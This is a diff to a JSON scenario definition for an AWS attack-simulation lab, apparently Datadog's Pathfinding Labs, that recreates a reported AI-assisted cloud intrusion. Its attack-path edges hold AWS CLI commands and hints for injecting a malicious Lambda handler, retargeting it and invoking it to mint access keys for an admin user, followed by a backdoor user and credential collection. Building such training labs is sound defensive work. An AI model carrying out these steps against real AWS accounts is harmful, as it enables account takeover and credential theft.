@@ -42,13 +42,17 @@
     "modulePath": "modules/scenarios/attack-simulation/sysdig-8-minutes-to-admin"
   },
   "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/attack-simulation/sysdig-8-minutes-to-admin",
-  "schemaVersion": "4.2.0",
+  "schemaVersion": "4.3.0",
   "source": {
     "url": "https://www.sysdig.com/blog/ai-assisted-cloud-intrusion-achieves-admin-access-in-8-minutes",
     "title": "AI-Assisted Cloud Intrusion Achieves Admin Access in 8 Minutes",
     "author": "Alessandro Brucato and Michael Clark (Sysdig Threat Research Team)",
     "date": "2026-02-03"
   },
+  "modifications": [
+    "In the original attack, the entry point was a publicly accessible S3 bucket containing embedded IAM credentials discovered via external recon. In this lab, the RAG data bucket is private \u2014 a starting IAM user (`pl-prod-8min-starting-user`) is pre-provisioned with read access to avoid publicly exposing real AWS credentials.",
+    "In the original attack, the attacker first attempted to launch `p5.48xlarge` GPU instances for unauthorized AI model training (which failed with InsufficientInstanceCapacity) before succeeding with `p3.2xlarge`. The lab demo replicates both attempts exactly, but the `p3.2xlarge` instance auto-terminates after 2 hours as a cost safeguard \u2014 run `cleanup_attack.sh` immediately after the demo."
+  ],
   "permissions": {
     "principals": [
       {
@@ -243,6 +247,14 @@
         "description": "pl-prod-8min-ec2-init is a Lambda function originally written to initialize EC2 instances as part of an internal provisioning workflow. Its execution role \u2014 pl-prod-8min-ec2-init-role \u2014 accumulated permissions over time as the team added EC2 initialization tasks. At some point someone added iam:CreateAccessKey on pl-prod-8min-frick to support a rotation workflow that was later abandoned. The permission was never removed.\nThe function's code is entirely replaceable by any principal with lambda:UpdateFunctionCode. Once the code is replaced, any call to lambda:InvokeFunction executes the new code under the execution role's identity \u2014 giving the caller access to all permissions that role holds.\nFirst injection attempt: the demo targets pl-prod-8min-admingh (a decoy user the execution role can also create keys for). The invocation succeeds but the keys produced have no useful permissions. Second injection: the demo targets pl-prod-8min-frick. Success.\n"
       },
       {
+        "id": "ec2-init-role",
+        "label": "EC2 Init Execution Role",
+        "type": "principal",
+        "subType": "iam-role",
+        "arn": "arn:aws:iam::{account_id}:role/pl-prod-8min-ec2-init-role",
+        "description": "pl-prod-8min-ec2-init-role is the IAM execution role attached to the pl-prod-8min-ec2-init Lambda function. When the Lambda is invoked, it assumes this role's identity and inherits all of its permissions. Over time, the role accumulated permissions beyond its original EC2 initialization purpose \u2014 including iam:CreateAccessKey on both pl-prod-8min-admingh (a decoy user) and pl-prod-8min-frick (the account's admin user). This over-permissioned execution role is the linchpin of the privilege escalation: without it, injecting code into the Lambda function would be useless.\n"
+      },
+      {
         "id": "frick-admin-user",
         "label": "Admin User (frick)",
         "type": "principal",
@@ -332,7 +344,7 @@
         "from": "compromised-user",
         "to": "ec2-init-lambda",
         "label": "lambda:UpdateFunctionCode + lambda:UpdateFunctionConfiguration",
-        "description": "Replace the Lambda function's code with a malicious handler that calls iam:CreateAccessKey on the target user, then modify the function's environment variables to pass the target username. Two injection attempts: first against admingh (fails \u2014 no useful permissions), then against frick (succeeds \u2014 admin access keys returned).\n",
+        "description": "Replace the Lambda function's code with a malicious handler that calls iam:CreateAccessKey on a target user specified via environment variable, then set the initial target username. The compromised user has lambda:UpdateFunctionCode, lambda:UpdateFunctionConfiguration, and lambda:InvokeFunction \u2014 full control over the function's behavior.\n",
         "commands": [
           {
             "description": "Write the malicious Lambda handler",
@@ -343,19 +355,32 @@
             "command": "cd /tmp && zip lambda_payload.zip lambda_payload.py"
           },
           {
-            "description": "First injection attempt \u2014 target admingh (decoy, will succeed but produce useless keys)",
+            "description": "Upload the malicious handler to the Lambda function",
             "command": "aws lambda update-function-code \\\n  --function-name pl-prod-8min-ec2-init \\\n  --zip-file fileb:///tmp/lambda_payload.zip"
           },
           {
             "description": "Set the target environment variable to admingh",
             "command": "aws lambda update-function-configuration \\\n  --function-name pl-prod-8min-ec2-init \\\n  --environment 'Variables={TARGET_USER=pl-prod-8min-admingh}'"
-          },
+          }
+        ],
+        "hints": [
+          "You have lambda:UpdateFunctionCode and lambda:InvokeFunction on pl-prod-8min-ec2-init. The function's execution role can create access keys for IAM users. Think about what you can do by replacing the function's code.",
+          "Write a Python Lambda handler that calls boto3's iam.create_access_key() with a target username. The handler will execute with the permissions of the Lambda execution role \u2014 not your current user.",
+          "Zip the handler, upload it with lambda:UpdateFunctionCode, then use lambda:UpdateFunctionConfiguration to set an environment variable with the target username. This avoids hardcoding the target in the zip."
+        ]
+      },
+      {
+        "from": "ec2-init-lambda",
+        "to": "ec2-init-role",
+        "label": "Assumes execution role on invocation",
+        "description": "When the Lambda function is invoked, AWS automatically assumes the attached execution role (pl-prod-8min-ec2-init-role). The injected code now runs with the role's full permission set \u2014 including iam:CreateAccessKey on pl-prod-8min-admingh and pl-prod-8min-frick. This is the pivot point: the attacker's code, executing under a privileged role, can perform actions the compromised user never could directly.\nThe first invocation targets pl-prod-8min-admingh. Key creation succeeds but the returned credentials have no useful permissions \u2014 admingh is a decoy. The second invocation targets pl-prod-8min-frick, the account's admin user.\n",
+        "commands": [
           {
-            "description": "Invoke with admingh \u2014 keys are created but admingh has no useful permissions",
+            "description": "Invoke with admingh \u2014 keys created but admingh has no useful permissions",
             "command": "aws lambda invoke \\\n  --function-name pl-prod-8min-ec2-init \\\n  --payload '{}' \\\n  /tmp/lambda_response_admingh.json\ncat /tmp/lambda_response_admingh.json"
           },
           {
-            "description": "Second injection attempt \u2014 retarget to frick (admin user)",
+            "description": "Retarget to frick (admin user)",
             "command": "aws lambda update-function-configuration \\\n  --function-name pl-prod-8min-ec2-init \\\n  --environment 'Variables={TARGET_USER=pl-prod-8min-frick}'"
           },
           {
@@ -364,18 +389,16 @@
           }
         ],
         "hints": [
-          "You have lambda:UpdateFunctionCode and lambda:InvokeFunction on pl-prod-8min-ec2-init. The function's execution role can create access keys for IAM users. Think about what you can do by replacing the function's code.",
-          "Write a Python Lambda handler that calls boto3's iam.create_access_key() with a target username. The handler will execute with the permissions of the Lambda execution role \u2014 not your current user.",
-          "Zip the handler, upload it with lambda:UpdateFunctionCode, then use lambda:UpdateFunctionConfiguration to set an environment variable with the target username. This avoids hardcoding the target in the zip.",
-          "Your first target might not have useful permissions even if key creation succeeds \u2014 the execution role can create keys for multiple users. Enumerate which users the role has iam:CreateAccessKey on, then target the admin user.",
-          "After invoking the function, parse the JSON response to extract the AccessKeyId and SecretAccessKey. These are the admin user's credentials."
+          "The Lambda's execution role is what gives the injected code its power. The attacker's own user cannot call iam:CreateAccessKey directly, but the execution role can.",
+          "Your first target might not have useful permissions even if key creation succeeds \u2014 the execution role can create keys for multiple users. Target the admin user.",
+          "After invoking the function, parse the JSON response to extract the AccessKeyId and SecretAccessKey."
         ]
       },
       {
-        "from": "ec2-init-lambda",
+        "from": "ec2-init-role",
         "to": "frick-admin-user",
-        "label": "iam:CreateAccessKey (via Lambda exec role)",
-        "description": "The injected Lambda code executes under pl-prod-8min-ec2-init-role's identity and calls iam:CreateAccessKey for pl-prod-8min-frick. The returned credentials grant full AdministratorAccess. The attacker then creates a backdoor IAM user, creates access keys for rocker (Bedrock persistence), invokes Bedrock models, attempts cross-account movement (all fail), collects secrets and parameters, and launches a GPU instance.\n",
+        "label": "iam:CreateAccessKey",
+        "description": "The injected Lambda code, executing as pl-prod-8min-ec2-init-role, calls iam:CreateAccessKey for pl-prod-8min-frick. The returned credentials grant full AdministratorAccess. The attacker then creates a backdoor IAM user, creates access keys for rocker (Bedrock persistence), invokes Bedrock models, attempts cross-account movement (all fail), collects secrets and parameters, and launches a GPU instance.\n",
         "commands": [
           {
             "description": "Configure frick's admin credentials",
